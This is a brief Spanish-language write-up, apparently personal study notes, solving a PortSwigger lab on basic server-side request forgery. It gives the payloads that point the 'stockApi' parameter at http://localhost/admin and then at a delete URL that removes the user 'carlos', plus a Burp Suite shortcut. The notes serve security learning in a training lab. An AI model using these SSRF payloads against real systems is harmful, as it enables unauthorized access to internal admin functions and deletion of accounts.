Tags: #SSRF #PortSwigger 

# Lab 1 Basic SSRF against the local server 

Este laboratorio se resuelve solicitando una acción al 'localhost'
```bash 
Ctrl + Shift + u   = Urldecodearlo en ButpSuite 

# Debemos de cambiar el 'stockApi'
stockApi=http://localhost/admin

# Para poder borrar debemos de mirar los hipervinculos y nos daran la estructura de borrado
stockApi=http://localhost/admin/delete?username=carlos
```